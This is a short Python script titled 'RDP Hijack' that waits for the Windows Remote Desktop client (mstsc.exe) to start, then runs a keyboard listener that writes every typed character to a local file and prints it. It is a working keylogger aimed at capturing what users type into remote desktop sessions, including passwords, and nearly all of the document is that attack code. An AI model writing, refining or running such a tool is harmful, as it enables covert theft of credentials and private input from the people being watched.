import psutil
import time
from pynput import keyboard

art = """
█▀█ █▀▄ █▀█   █░█ █ ░░█ ▄▀█ █▀▀ █▄▀  ---------------
█▀▄ █▄▀ █▀▀   █▀█ █ █▄█ █▀█ █▄▄ █░█  by Nuhu Tahiru 
                                     ---------------    
"""

print(art)
print("_"*48)

while True:
    
    processes = list(psutil.process_iter(['pid', 'name']))

  
    mstsc_running = any(process_info.info['name'] == 'mstsc.exe' for process_info in processes)

    if mstsc_running:
        print("")
        print("---------------------------------")
        print("[+] RDP is now open")
        print("[+] Starting RDP data hijacking")
        print("---------------------------------")
        def keyPressed(key):
            #print(str(key))
            with open("keyfile.txt", 'a') as logKey:
                try:
                    char = key.char
                    logKey.write(char)
                    if char:    
                        print(char, end="", flush=True)
    
                    
                except:
                    print("\n")

                    

        if __name__ == "__main__":
            listener = keyboard.Listener(on_press=keyPressed)
            listener.start()
            input()
        break
    else:
        print("[+]Waiting for RDP related processes")

    
    time.sleep(5)
